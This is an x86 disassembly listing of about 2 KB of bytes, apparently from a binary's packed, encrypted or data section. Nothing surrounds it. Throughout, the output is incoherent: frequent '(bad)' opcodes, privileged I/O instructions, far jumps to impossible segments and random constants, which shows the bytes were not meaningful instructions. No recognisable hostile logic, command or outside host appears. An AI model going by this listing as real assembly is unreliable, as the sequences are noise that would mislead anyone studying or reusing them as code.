  407ab0:	xor    al,0x63
  407ab2:	hlt    
  407ab3:	sub    edi,DWORD PTR [ebx-0x67]
  407ab6:	(bad)  
  407ab7:	shl    BYTE PTR [ecx-0x41],1
  407aba:	in     al,0x61
  407abc:	push   cs
  407abd:	in     eax,dx
  407abe:	into   
  407abf:	ja     0x407aaa
  407ac1:	sbb    al,0x9e
  407ac3:	add    eax,0x80ccf58e
  407ac8:	ja     0x407a8b
  407aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407acb:	mov    ebx,0x3462f80a
  407ad0:	add    BYTE PTR [esi],0xc1
  407ad3:	aam    0x77
  407ad5:	fucomip st,st(4)
  407ad7:	(bad)
  407adb:	ds es cld 
  407ade:	arpl   WORD PTR ds:0x44bbd7f6,dx
  407ae4:	lds    ebp,FWORD PTR [edx+0x9]
  407ae7:	fistp  QWORD PTR [eax+0x6b]
  407aea:	(bad)  
  407aeb:	mov    al,BYTE PTR [ebp-0x6b5f7e6a]
  407af1:	ss cmp dl,dl
  407af4:	lea    edi,[esi-0xf]
  407af7:	aad    0x2c
  407af9:	jno    0x407b3a
  407afb:	xchg   ebx,eax
  407afc:	loop   0x407b32
  407afe:	xor    al,0x73
  407b00:	adc    al,0xb9
  407b02:	pop    es
  407b03:	push   esi
  407b04:	ror    DWORD PTR [esi-0x4f],1
  407b07:	aad    0xd
  407b09:	push   ss
  407b0a:	sub    cl,BYTE PTR [edx]
  407b0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b0e:	jp     0x407b16
  407b10:	fisubr WORD PTR [edi]
  407b12:	aaa    
  407b13:	fs inc ebx
  407b15:	imul   edx,DWORD PTR [ecx-0x9],0x86c2fa23
  407b1c:	xlat   BYTE PTR ds:[ebx]
  407b1d:	mov    ch,0x86
  407b1f:	xor    eax,0x8618a879
  407b24:	push   eax
  407b25:	dec    esi
  407b26:	dec    edi
  407b27:	dec    DWORD PTR [ebx+0x1ce7b254]
  407b2d:	sbb    bl,BYTE PTR [ebx]
  407b2f:	adc    ebx,DWORD PTR [edi+0x60]
  407b32:	ret    0xc9a6
  407b35:	sbb    al,0x7b
  407b37:	jnp    0x407b61
  407b39:	loopne 0x407b23
  407b3b:	cli    
  407b3c:	dec    edx
  407b3d:	pop    edx
  407b3e:	ja     0x407b46
  407b40:	xor    DWORD PTR [eax],edi
  407b42:	cmp    dl,BYTE PTR fs:[ebp-0x46]
  407b46:	es out 0x4a,al
  407b49:	xchg   ebp,eax
  407b4a:	sub    DWORD PTR [edi+ebx*8-0x1a80dca9],eax
  407b51:	int3   
  407b52:	sub    esi,eax
  407b54:	mov    al,0x3c
  407b56:	dec    ecx
  407b57:	or     eax,0x5665fe59
  407b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b5d:	fcom   QWORD PTR [ecx-0x1de96f04]
  407b63:	xlat   BYTE PTR ds:[ebx]
  407b64:	sti    
  407b65:	inc    esi
  407b66:	popa   
  407b67:	adc    eax,0x1e631ac
  407b6c:	jmp    0x6b6a7b17
  407b71:	icebp  
  407b72:	sub    ecx,edx
  407b74:	aaa    
  407b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b76:	lods   al,BYTE PTR ds:[esi]
  407b77:	and    BYTE PTR [ebx-0x78f03908],ah
  407b7d:	jb     0x407bfa
  407b7f:	mov    WORD PTR [ebx-0x731eb593],cs
  407b85:	out    0xcc,al
  407b87:	scas   al,BYTE PTR es:[edi]
  407b88:	push   ss
  407b89:	or     ah,al
  407b8b:	mov    esi,0x1b866567
  407b90:	jmp    0x407ba7
  407b92:	cmp    ebx,DWORD PTR [ecx]
  407b94:	xchg   BYTE PTR [ecx],al
  407b96:	xchg   DWORD PTR [esi-0xd18a752],ebx
  407b9c:	pop    esi
  407b9d:	mulps  xmm6,XMMWORD PTR ds:0xb2d5cc28
  407ba4:	fst    QWORD PTR [edx]
  407ba6:	(bad)  
  407ba7:	sub    DWORD PTR fs:[edx-0x65],ecx
  407bab:	int3   
  407bac:	repnz add DWORD PTR [eax-0x450da3d3],ebx
  407bb3:	adc    ebp,DWORD PTR [edx-0x601390ca]
  407bb9:	in     al,0x2b
  407bbb:	jne    0x407bcb
  407bbd:	call   0x13e:0xb320aab0
  407bc4:	or     eax,0x10c0a989
  407bc9:	imul   edi,DWORD PTR ss:[ecx-0x19],0x63393342
  407bd1:	jnp    0x407c30
  407bd3:	rol    esp,0x5c
  407bd6:	pop    esp
  407bd7:	ds pop ds
  407bd9:	mov    al,0x1f
  407bdb:	mov    edx,0x90660d5e
  407be0:	push   DWORD PTR [esi-0xa]
  407be3:	ficom  DWORD PTR [ebp+0x620dbc69]
  407be9:	xchg   dl,ch
  407beb:	dec    DWORD PTR [edi]
  407bed:	mov    al,ds:0x9dec2e53
  407bf2:	das    
  407bf3:	xchg   edi,eax
  407bf4:	mov    esp,0x573b7b70
  407bf9:	sub    ebp,DWORD PTR [esp+eiz*4]
  407bfc:	out    dx,eax
  407bfd:	pop    ebp
  407bfe:	std    
  407bff:	adc    BYTE PTR [edi+0x1d],al
  407c02:	retf   
  407c03:	or     cl,BYTE PTR [edi+0x1a18db8c]
  407c09:	cli    
  407c0a:	jnp    0x407b92
  407c0c:	nop
  407c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c0e:	clc    
  407c0f:	les    esp,FWORD PTR [esi]
  407c11:	xchg   edi,eax
  407c12:	shr    DWORD PTR [ebp+0x46],0x5a
  407c16:	out    0x5a,eax
  407c18:	mov    cl,0x63
  407c1a:	repz jmp 0xcf97:0xdae7a873
  407c22:	imul   esp,DWORD PTR [ecx+0x40c2157b],0x1469b73d
  407c2c:	mov    eax,ds:0x42e2b7
  407c31:	dec    edx
  407c32:	jmp    0x409f81
  407c37:	mov    al,0x4e
  407c39:	cmp    bh,ch
  407c3b:	mov    ds:0xc733738b,al
  407c40:	sbb    BYTE PTR ds:0xde7e43e6,cl
  407c46:	push   0x6
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	repnz xor BYTE PTR [edx-0x44],cl
  407c53:	inc    ebp
  407c54:	sbb    eax,0x92bd2d0
  407c59:	mov    ecx,0x38c2b610
  407c5e:	lea    edx,[edx]
  407c60:	std    
  407c61:	dec    edx
  407c62:	js     0x407cd7
  407c64:	jb     0x407c1d
  407c66:	or     ecx,DWORD PTR [ecx+0x510459d0]
  407c6c:	inc    ecx
  407c6d:	dec    ebx
  407c6e:	xor    BYTE PTR [ecx],bh
  407c70:	out    dx,al
  407c71:	fidivr DWORD PTR [eax+0x75]
  407c74:	cmp    al,0x5a
  407c76:	mov    ebp,0x2d43698f
  407c7b:	xor    eax,0x69c9e08f
  407c80:	or     cl,BYTE PTR [ebx+edi*2+0x13]
  407c84:	mov    ds:0x2f31bf65,al
  407c89:	arpl   WORD PTR [esp+edi*2],ax
  407c8c:	push   0x41
  407c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8f:	jns    0x407ca8
  407c91:	test   DWORD PTR [ebp-0x51],eax
  407c94:	cmp    BYTE PTR [eax-0x35794263],dh
  407c9a:	fisub  WORD PTR [esi+0x74]
  407c9d:	mov    edx,0x4731898a
  407ca2:	sbb    eax,0x12f0feb0
  407ca7:	adc    eax,0xabff98f7
  407cac:	jno    0x407cf6
  407cae:	pop    ebp
  407caf:	mov    esi,0x7560febc
  407cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cb5:	and    ebx,esi
  407cb7:	and    bl,BYTE PTR [edi-0x20]
  407cba:	lods   eax,DWORD PTR ds:[esi]
  407cbb:	in     al,dx
  407cbc:	repnz xchg esp,eax
  407cbe:	pop    ss
  407cbf:	sar    DWORD PTR ds:0x32f925dc,0x15
  407cc6:	rol    ah,1
  407cc8:	movsx  eax,di
  407ccb:	and    ah,ch
  407ccd:	pop    edi
  407cce:	(bad)
  407cd2:	xor    DWORD PTR [si+0x7c],esi
  407cd6:	call   0x2ea:0x895e38b2
  407cdd:	leave  
  407cde:	into   
  407cdf:	cmp    ebp,edx
  407ce1:	add    DWORD PTR [esi-0x46],ecx
  407ce4:	pop    edi
  407ce5:	sub    al,0x3a
  407ce7:	and    BYTE PTR [ecx],bh
  407ce9:	inc    esp
  407cea:	jb     0x407cc3
  407cec:	sidtd  [ebp-0x2b]
  407cf0:	outs   dx,DWORD PTR ds:[esi]
  407cf1:	fiadd  DWORD PTR [edi]
  407cf3:	shld   ebp,ecx,cl
  407cf6:	iret   
  407cf7:	or     DWORD PTR [eax],ebp
  407cf9:	stos   DWORD PTR es:[edi],eax
  407cfa:	mov    esi,0x23febd2a
  407cff:	int3   
  407d00:	inc    edi
  407d01:	mov    al,ds:0xc7671f99
  407d06:	mov    edi,0x62502294
  407d0b:	mov    ebx,0x490186fb
  407d10:	loop   0x407cf2
  407d12:	jle    0x407d79
  407d14:	mov    edx,0xb66c0286
  407d19:	cmc    
  407d1a:	and    eax,0xe80f994f
  407d1f:	out    0x1,eax
  407d21:	sub    eax,0x96327d11
  407d26:	aad    0xdc
  407d28:	jmp    0x407d0b
  407d2a:	mov    bl,0x83
  407d2c:	test   al,0xbb
  407d2e:	jnp    0x407d5d
  407d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d31:	or     al,0x21
  407d33:	imul   ebp,DWORD PTR [ebx+ecx*2-0x1124ba33],0x50d26c7
  407d3e:	xchg   edx,eax
  407d3f:	in     eax,0x17
  407d41:	xchg   ecx,eax
  407d42:	out    0x2,al
  407d44:	shl    ah,cl
  407d46:	or     DWORD PTR [ebx-0x1bfa10a3],0xffffffe4
  407d4d:	pop    ecx
  407d4e:	mov    cl,cl
  407d50:	xchg   esp,eax
  407d51:	ins    DWORD PTR es:[edi],dx
  407d52:	lock sahf 
  407d54:	into   
  407d55:	stos   BYTE PTR es:[edi],al
  407d56:	mov    bh,bh
  407d58:	mov    fs,WORD PTR [edi]
  407d5a:	push   ebp
  407d5b:	mov    ?,WORD PTR [eax+edx*8-0xd]
  407d5f:	mov    dh,0x3d
  407d61:	imul   edx,DWORD PTR [ecx],0x1
  407d64:	or     BYTE PTR [ecx],0x2a
  407d67:	sub    eax,0x724e8f5f
  407d6c:	cld    
  407d6d:	add    eax,0x5453727
  407d72:	pop    edi
  407d73:	sbb    DWORD PTR [ebx+eax*8-0x72],0xffffffb3
  407d78:	mov    ebp,es
  407d7a:	mov    WORD PTR [ebx],fs
  407d7c:	push   0xd027fba8
  407d81:	sub    al,0x38
  407d83:	aas    
  407d84:	xchg   ebp,eax
  407d85:	ficomp DWORD PTR [esi]
  407d87:	lahf   
  407d88:	xchg   ebp,eax
  407d89:	shl    bl,0x7
  407d8c:	inc    eax
  407d8d:	sbb    cl,BYTE PTR [ebp+0x7f833107]
  407d93:	mov    edi,0xc5ed20f4
  407d98:	les    edx,FWORD PTR [ecx+0x7580e729]
  407d9e:	cwde   
  407d9f:	mov    ds:0x75d40d4a,al
  407da4:	iret   
  407da5:	pop    edi
  407da6:	and    edx,DWORD PTR [ecx-0x8]
  407da9:	enter  0xdbcd,0x10
  407dad:	aad    0x3f
  407daf:	(bad)  
  407db2:	xor    eax,0x3ec94b52
  407db7:	imul   esi,DWORD PTR [esi],0x7fe1ca28
  407dbd:	lods   al,BYTE PTR ds:[esi]
  407dbe:	lods   eax,DWORD PTR ds:[esi]
  407dbf:	fsubr  DWORD PTR [edi+0x67]
  407dc2:	nop
  407dc3:	cmp    DWORD PTR [eax-0x4f],ecx
  407dc6:	jns    0x407e06
  407dc8:	push   0xddab3200
  407dcd:	(bad)  
  407dcf:	sub    esp,DWORD PTR [esi-0x79]
  407dd2:	fs add ebx,ecx
  407dd5:	xor    DWORD PTR [eax+0x24],esp
  407dd8:	shl    DWORD PTR [ebx-0x25],0xa6
  407ddc:	daa    
  407ddd:	jno    0x407e50
  407ddf:	shl    BYTE PTR [ecx-0x29],cl
  407de2:	loope  0x407e0b
  407de4:	xor    eax,0xd70f6252
  407de9:	mov    DWORD PTR [esi],ecx
  407deb:	stos   BYTE PTR es:[edi],al
  407dec:	jne    0x407d78
  407dee:	nop
  407def:	xchg   esp,eax
  407df0:	xchg   BYTE PTR ds:0xe2f00a40,dl
  407df6:	in     al,dx
  407df7:	bound  ecx,QWORD PTR [esi-0x54]
  407dfa:	js     0x407de9
  407dfc:	cmp    BYTE PTR [esi],0x2b
  407dff:	bound  esp,QWORD PTR [edi+0x46]
  407e02:	push   ss
  407e03:	cmp    ebp,DWORD PTR ds:0x608a0c56
  407e09:	mov    BYTE PTR [edi+0x72c3457d],ch
  407e0f:	ds xchg ebp,eax
  407e11:	cwde   
  407e12:	outs   dx,DWORD PTR ds:[esi]
  407e13:	xchg   BYTE PTR [ebx],ah
  407e15:	jl     0x407df2
  407e17:	out    0x47,eax
  407e19:	add    eax,0x4528eaa0
  407e1e:	aam    0xe5
  407e20:	push   ss
  407e21:	pop    esi
  407e22:	into   
  407e23:	xchg   ebp,eax
  407e24:	iret   
  407e25:	fs xchg ebp,eax
  407e27:	mov    ah,dh
  407e29:	jbe    0x407e04
  407e2b:	test   DWORD PTR [eax+0x5a214d9e],0x2f811b08
  407e35:	push   es
  407e36:	pop    esi
  407e37:	mov    cl,0xb0
  407e39:	jnp    0x407e57
  407e3b:	mov    eax,ds:0xd1022450
  407e40:	enter  0x2113,0x74
  407e44:	cmp    al,0x38
  407e46:	inc    edx
  407e47:	jnp    0x407dd8
  407e49:	xchg   esi,eax
  407e4a:	sub    BYTE PTR [ecx+ecx*2],al
  407e4d:	test   DWORD PTR [eax],eax
  407e4f:	sub    eax,0xf600b4c5
  407e54:	push   cs
  407e55:	sbb    al,BYTE PTR [esp+ecx*8+0x44]
  407e59:	aam    0x8a
  407e5b:	xor    esi,edi
  407e5d:	mov    esp,0x33d64615
  407e62:	mov    edi,0x42b8e74c
  407e67:	call   FWORD PTR cs:[ebp-0x59999484]
  407e6e:	adc    eax,0x87b807b5
  407e73:	clc    
  407e74:	leave  
  407e75:	les    ebp,FWORD PTR [eax-0x53]
  407e78:	in     eax,0xa9
  407e7a:	add    al,0x7e
  407e7c:	in     al,0x94
  407e7e:	ins    DWORD PTR es:[edi],dx
  407e7f:	rcr    DWORD PTR [ebx-0x3a],cl
  407e82:	pop    esi
  407e83:	(bad)  
  407e84:	fcomip st,st(0)
  407e86:	ja     0x407e2a
  407e88:	aaa    
  407e89:	inc    esi
  407e8a:	or     BYTE PTR [eax],dh
  407e8c:	ja     0x407edf
  407e8e:	addr16 std 
  407e90:	jmp    0x4d87:0xef30575a
  407e97:	shl    BYTE PTR [ecx],1
  407e99:	scas   al,BYTE PTR es:[edi]
  407e9a:	das    
  407e9b:	pop    esp
  407e9c:	in     eax,dx
  407e9d:	sti    
  407e9e:	sti    
  407e9f:	add    DWORD PTR [esi],0x81d85cac
  407ea5:	adc    eax,0x7b3f5edb
  407eaa:	mov    bl,0xde
  407eac:	or     al,0x44
  407eae:	xor    dh,al
  407eb0:	xor    esp,eax
  407eb2:	in     al,dx
  407eb3:	popf   
  407eb4:	pop    ebx
  407eb5:	in     al,0x63
  407eb7:	arpl   WORD PTR [esi],si
  407eb9:	cld    
  407eba:	(bad)  
  407ebb:	mov    eax,ds:0x78389ad7
  407ec0:	xor    eax,DWORD PTR [edx-0x3d990027]
  407ec6:	mov    al,cl
  407ec8:	imul   esi,DWORD PTR [ebp+0x6fca0742],0xffffffbf
  407ecf:	add    eax,0x20de879b
  407ed4:	int3   
  407ed5:	xor    ebp,DWORD PTR [ecx]
  407ed7:	mov    eax,ds:0x6d8a1926
  407edc:	xchg   bh,al
  407ede:	push   ebx
  407edf:	pop    esi
  407ee0:	adc    ebp,edi
  407ee2:	mov    ecx,0xb116aeda
  407ee7:	pop    ebx
  407ee8:	and    al,0x31
  407eea:	mov    edx,0xb467826a
  407eef:	int3   
  407ef0:	cmp    BYTE PTR [ecx+0x7b378968],cl
  407ef6:	inc    edi
  407ef7:	mov    dh,0x60
  407ef9:	shr    BYTE PTR [edi-0x1d],0xf6
  407efd:	in     al,0x6e
  407eff:	dec    ebp
  407f00:	aaa    
  407f01:	or     dh,dh
  407f03:	jmp    0xed2a3f40
  407f08:	add    DWORD PTR [ebx-0x884b372],ebp
  407f0e:	daa    
  407f0f:	sub    edi,DWORD PTR [eax]
  407f11:	stc    
  407f12:	adc    eax,0xc101dff0
  407f17:	adc    dh,BYTE PTR [ebx-0x5fd4ba10]
  407f1d:	jge    0x407f30
  407f1f:	loopne 0x407ea3
  407f21:	mov    ebx,0x681b1d4f
  407f26:	mov    ds:0xf5ad5fc5,al
  407f2b:	mov    edi,0x89e1e54c
  407f30:	jo     0x407f8c
  407f32:	icebp  
  407f33:	ins    BYTE PTR es:[edi],dx
  407f34:	and    BYTE PTR [ebx-0x3c],0xa2
  407f38:	test   DWORD PTR ds:0x78986c1c,eax
  407f3e:	pop    edx
  407f3f:	jne    0x407ed9
  407f41:	bound  edx,QWORD PTR [eax]
  407f43:	or     DWORD PTR [edi-0x5e3756bc],0x54e40f
  407f4d:	mov    ds:0xf49850ff,al
  407f52:	jo     0x407f28
  407f54:	mov    ds:0x6d53764e,al
  407f59:	(bad)  
  407f5a:	ins    BYTE PTR es:[edi],dx
  407f5b:	add    al,0x1d
  407f5d:	and    esp,DWORD PTR [ecx]
  407f5f:	mov    edx,0x12db1aff
  407f64:	mov    ah,0xad
  407f66:	push   ss
  407f67:	int3   
  407f68:	pop    ecx
  407f69:	push   cs
  407f6a:	jns    0x407fbe
  407f6c:	jmp    0x407ef8
  407f6e:	shr    BYTE PTR [edi],cl
  407f70:	push   esi
  407f71:	jnp    0x407f7b
  407f73:	bound  edx,QWORD PTR [ebx-0x17]
  407f76:	adc    DWORD PTR [edi+0x56],esp
  407f79:	mov    bl,0xe5
  407f7b:	retf   
  407f7c:	inc    di
  407f7e:	sub    eax,DWORD PTR [edi+0x43]
  407f81:	sub    al,0x78
  407f83:	ja     0x407f6f
  407f85:	div    BYTE PTR [ebp-0x70]
  407f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f89:	or     DWORD PTR [eax-0x278c437e],0x600f0343
  407f93:	rol    DWORD PTR [ecx],cl
  407f95:	rol    DWORD PTR [esi-0x4b],cl
  407f98:	push   ds
  407f99:	and    eax,0x2ae9d042
  407f9e:	pop    ebp
  407f9f:	pop    ebx
  407fa0:	xor    cl,bh
  407fa2:	ss inc ebp
  407fa4:	loop   0x407fd3
  407fa6:	inc    ecx
  407fa7:	mov    edi,0xc0965bbc
  407fac:	(bad)
  407fb0:	jnp    0x407fd2
  407fb2:	pop    eax
  407fb3:	mov    eax,0xd8b7546c
  407fb9:	push   edx
  407fba:	add    edx,DWORD PTR [edi+0x2a0cf5b2]
  407fc0:	jns    0x407f78
  407fc2:	mov    ebx,0xb2bc75a4
  407fc7:	sahf   
  407fc8:	mov    DWORD PTR [ebx+0x56],esi
  407fcb:	sub    ebp,edi
  407fcd:	cld    
  407fce:	leave  
  407fcf:	push   eax
  407fd0:	das    
  407fd1:	arpl   WORD PTR [ecx-0x16e9eb1f],cx
  407fd7:	(bad)  
  407fd8:	mov    ebp,0x667c2283
  407fdd:	and    ah,BYTE PTR [esi]
  407fdf:	mov    eax,fs:0x2e14f888
  407fe5:	xor    al,0x74
  407fe7:	xchg   ebp,eax
  407fe8:	out    0x4f,eax
  407fea:	xchg   esp,eax
  407feb:	xor    ch,dl
  407fed:	leave  
  407fee:	int3   
  407fef:	mov    al,0xf1
  407ff1:	(bad)  
  407ff2:	jo     0x407f94
  407ff4:	xorps  xmm6,xmm0
  407ff7:	pop    ebx
  407ff8:	or     al,0xb
  407ffa:	(bad)  
  407ffb:	adc    bh,BYTE PTR ds:[ecx]
  407ffe:	lahf   
  407fff:	fdiv   DWORD PTR [eax-0xdc7383c]
  408005:	jmp    0x716df684
  40800a:	mov    WORD PTR [ebx],ds
  40800c:	dec    ebp
  40800d:	pushf  
  40800e:	push   eax
  40800f:	into   
  408010:	mov    ch,0xc5
  408012:	dec    ebx
  408013:	test   BYTE PTR [esi],bh
  408015:	push   eax
  408016:	dec    ecx
  408017:	mov    bl,0x74
  408019:	cmovl  esi,DWORD PTR [eax-0x752d7e45]
  408020:	icebp  
  408021:	dec    ebx
  408022:	cmp    eax,0x61954558
  408027:	out    dx,eax
  408028:	fsubp  st(4),st
  40802a:	push   esp
  40802b:	jecxz  0x408065
  40802d:	call   0x9a8b:0x33591227
  408034:	(bad)  
  408036:	mov    eax,ds:0xbc80e0d8
  40803b:	cli    
  40803c:	xlat   BYTE PTR ds:[ebx]
  40803d:	jle    0x40806b
  40803f:	retf   0x1f01
  408042:	ja     0x408053
  408044:	cmp    eax,0xdb1f1c5f
  408049:	add    BYTE PTR [edx-0x1c],al
  40804c:	(bad)  
  40804d:	adc    ah,dl
  40804f:	add    cl,BYTE PTR [eax]
  408051:	loop   0x40802f
  408053:	pop    edi
  408054:	inc    esp
  408055:	ds das 
  408057:	daa    
  408058:	icebp  
  408059:	dec    ebp
  40805a:	shl    BYTE PTR [eax-0x255b50b0],0x50
  408061:	call   0xbc84:0x85d18f4b
  408068:	(bad)  
  408069:	ss inc eax
  40806b:	pop    esp
  40806c:	aaa    
  40806d:	jb     0x408039
  40806f:	scas   eax,DWORD PTR es:[edi]
  408070:	dec    ecx
  408071:	pop    es
  408072:	adc    ebp,DWORD PTR [eax]
  408074:	mov    cl,0x69
  408076:	xor    BYTE PTR [eax+0x7a0ecedb],dh
  40807c:	inc    ebx
  40807d:	cmp    BYTE PTR [ebx+0x4dd0bb82],al
  408083:	mul    BYTE PTR [eax+eiz*1-0xb]
  408087:	jno    0x408022
  408089:	nop
  40808a:	add    eax,0xc828f88a
  40808f:	push   esp
  408090:	jg     0x408104
  408092:	mov    esi,0xed6482c4
  408097:	loope  0x4080a0
  408099:	fs push ebp
  40809b:	ror    BYTE PTR ds:[ecx+0x1d],cl
  40809f:	imul   ebx,DWORD PTR [esi+ebp*8+0x5f],0xffffffa5
  4080a4:	sbb    cl,ah
  4080a6:	inc    eax
  4080a7:	into   
  4080a8:	sub    edx,ebp
  4080aa:	sub    DWORD PTR [ebx-0x33],ecx
  4080ad:	sub    ebp,DWORD PTR [edi+0x68]
  4080b0:	enter  0xf199,0xbe
  4080b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b5:	sti    
  4080b6:	shl    DWORD PTR [esi],0xf9
  4080b9:	add    ecx,DWORD PTR [eax+edi*4-0x4b]
  4080bd:	fwait
  4080be:	pop    ds
  4080bf:	dec    ebx
  4080c0:	xor    DWORD PTR [ebx+0x2],ebx
  4080c3:	loopne 0x40811f
  4080c5:	out    0xf3,al
  4080c7:	loopne 0x4080b3
  4080c9:	outs   dx,DWORD PTR ds:[esi]
  4080ca:	cmp    ch,BYTE PTR [eax+0x681a5c15]
  4080d0:	jns    0x4080b5
  4080d2:	mov    eax,ds:0x6ac1416
  4080d7:	test   eax,0xe91da37e
  4080dc:	pop    edx
  4080dd:	retf   0x7f54
  4080e0:	ror    BYTE PTR [ebp+0x34974f4],cl
  4080e6:	out    dx,eax
  4080e7:	push   esi
  4080e8:	fwait
  4080e9:	and    bl,BYTE PTR [ebx]
  4080eb:	and    al,0xdd
  4080ed:	daa    
  4080ee:	in     al,dx
  4080ef:	aam    0x60
  4080f1:	xor    al,0x76
  4080f3:	idiv   BYTE PTR [edx]
  4080f5:	xchg   DWORD PTR [eax+0x4ee2f52f],ebp
  4080fb:	int    0x2a
  4080fd:	and    al,0xad
  4080ff:	imul   ebp,DWORD PTR [edx+0xa],0x34e54dc7
  408106:	(bad)  
  408107:	std    
  408108:	xor    eax,0x37d7b631
  40810d:	scas   eax,DWORD PTR es:[edi]
  40810e:	sti    
  40810f:	mov    esp,0x4db9b7b5
  408114:	adc    DWORD PTR [ecx],0x79
  408117:	or     ebp,DWORD PTR gs:[edi-0x78]
  40811b:	imul   edi,DWORD PTR [edx-0x4f],0x73f57e66
  408122:	add    DWORD PTR [edx+ecx*4+0x6d],ebp
  408126:	mov    edx,0xbeeb0145
  40812b:	push   ebp
  40812c:	xlat   BYTE PTR ds:[ebx]
  40812d:	mov    ebx,0x8bfb3398
  408132:	jg     0x40811b
  408134:	xchg   edi,eax
  408135:	jmp    0x80066f56
  40813a:	or     al,0xd0
  40813c:	mov    esi,0x87660d76
  408141:	call   0x930aaee
  408146:	mov    al,0x79
  408148:	xor    esi,DWORD PTR [ebx+0x7f06d108]
  40814e:	jg     0x4080d5
  408150:	cld    
  408151:	inc    edx
  408152:	push   cs
  408153:	in     eax,0xe4
  408155:	js     0x40818e
  408157:	addr16 sti 
  408159:	jmp    0x408101
  40815b:	stos   DWORD PTR es:[edi],eax
  40815c:	sub    eax,0x2e3dd584
  408161:	and    ebp,ebx
  408163:	inc    eax
  408164:	idiv   DWORD PTR [edx+0x696fa431]
  40816a:	stc    
  40816b:	neg    DWORD PTR [eax]
  40816d:	cwde   
  40816e:	ror    DWORD PTR [edx],1
  408170:	xchg   ecx,eax
  408171:	fld    TBYTE PTR [eax+ebx*1-0x7f]
  408175:	add    eax,0xf64f2d33
  40817a:	jne    0x408170
  40817c:	ss jmp 0x4081c3
  40817f:	mov    al,ds:0x8abf13d7
  408184:	scas   al,BYTE PTR es:[edi]
  408185:	sub    DWORD PTR [esi-0x26],0x57
  408189:	jo     0x408121
  40818b:	pusha  
  40818c:	js     0x40811e
  40818e:	push   esp
  40818f:	add    al,0x8d
  408191:	jne    0x408212
  408193:	(bad)  
  408194:	sbb    DWORD PTR [esi+0x555f91f9],ecx
  40819a:	(bad)  
  40819b:	rol    DWORD PTR [esi+0x1f],1
  40819e:	cmp    DWORD PTR [edx-0x7],0x1
  4081a2:	mov    ebx,0xafa742f8
  4081a7:	cmp    BYTE PTR [ebx+0x2d],bl
  4081aa:	and    DWORD PTR [eax],esp
  4081ac:	lahf   
  4081ad:	mov    fs,WORD PTR [ebx]
  4081af:	sub    eax,0x14d0a5af
  4081b4:	loopne 0x408167
  4081b6:	inc    ebp
  4081b7:	shr    DWORD PTR [esi+0x4],cl
  4081ba:	psubsw mm5,QWORD PTR [esi]
  4081bd:	int3   
  4081be:	xchg   ebp,eax
  4081bf:	cmp    BYTE PTR [eax+ecx*2+0x79],0xcf
  4081c4:	inc    esp
  4081c5:	lds    ecx,FWORD PTR [edx]
  4081c7:	ror    BYTE PTR [ebx+0x37],0xb6
  4081cb:	pop    ds
  4081cc:	imul   bh
  4081ce:	mov    al,ds:0xab95bc8b
  4081d3:	push   eax
  4081d4:	dec    ebx
  4081d5:	mov    eax,ds:0x61d09712
  4081da:	xchg   ecx,eax
  4081db:	pop    ds
  4081dc:	stos   DWORD PTR es:[edi],eax
  4081dd:	xchg   edx,eax
  4081de:	adc    ch,BYTE PTR ss:0x60f90765
  4081e5:	push   es
  4081e6:	mov    ebp,0x1bb0001f
  4081eb:	lds    edi,FWORD PTR [edi-0x11b89914]
  4081f1:	jge    0x4081af
  4081f3:	push   0x1f83d691
  4081f8:	mov    esp,0x69a8188b
  4081fd:	xchg   ebp,eax
  4081fe:	rcr    BYTE PTR [ecx+0x55],1
  408201:	add    edx,DWORD PTR [ebp+0x6e93b74e]
  408207:	add    ebx,0xffffffe5
  40820a:	imul   ebp,DWORD PTR [edx],0x42
  40820d:	jmp    0x41c5e08f
  408212:	sbb    eax,0x8c65ec79
  408217:	adc    BYTE PTR [esi-0xa],dl
  40821a:	(bad)  
  40821b:	neg    ebp
  40821d:	inc    ecx
  40821e:	adc    eax,DWORD PTR [ebx]
  408220:	jnp    0x408264
  408222:	mov    cs,WORD PTR [esi+ebp*8+0x146ec605]
  408229:	push   0x2
  40822b:	mov    ebp,0x356fb1d6
  408230:	lahf   
  408231:	lock sahf 
  408233:	pop    es
  408234:	stos   DWORD PTR es:[edi],eax
  408235:	scas   al,BYTE PTR es:[edi]
  408236:	int3   
  408237:	ins    BYTE PTR es:[edi],dx
  408238:	ficom  DWORD PTR [esi-0x5193d4d5]
  40823e:	jmp    0xcee8216d
  408243:	fwait
  408244:	pop    esp
  408245:	fdiv   QWORD PTR [edx+0x2b3018c3]
  40824b:	dec    eax
  40824c:	ins    BYTE PTR es:[edi],dx
  40824d:	fistp  QWORD PTR [edx+0x7f]
  408250:	dec    edi
  408251:	xchg   edx,eax
  408252:	call   0xc17e77f2
  408257:	jge    0x40822f
  408259:	pusha  
  40825a:	and    dl,BYTE PTR [ecx-0x6cf42166]
  408260:	dec    esi
  408261:	mov    al,0x5d
  408263:	sbb    al,0x60
  408265:	out    0x5b,eax
  408267:	lods   eax,DWORD PTR ds:[esi]
  408268:	stos   BYTE PTR es:[edi],al
  408269:	mov    edi,0x98a0b92f
  40826e:	nop
  40826f:	and    al,0x67
  408271:	pmulhuw mm7,QWORD PTR [esi]
  408274:	jne    0x4082bc
  408276:	test   al,0xd8
  408278:	inc    ecx
  408279:	dec    ecx
  40827a:	(bad)  
  40827b:	lds    esp,FWORD PTR ds:0x4ac04c02
  408281:	adc    ah,BYTE PTR [ecx+0x17]
  408284:	stos   BYTE PTR es:[edi],al
  408285:	test   DWORD PTR ds:0xe3842dfd,0x730a06d5
  40828f:	call   0xfb46:0xfe3717b4
  408296:	ins    BYTE PTR es:[edi],dx
  408297:	sub    DWORD PTR [edx+0x575f4e40],edi
  40829d:	ret    0x5537
  4082a0:	mov    dh,0x2
  4082a2:	js     0x4082e1
  4082a4:	sub    DWORD PTR [edi],0x775691f3
  4082aa:	std    
  4082ab:	cmp    esp,ebx
  4082ad:	push   eax
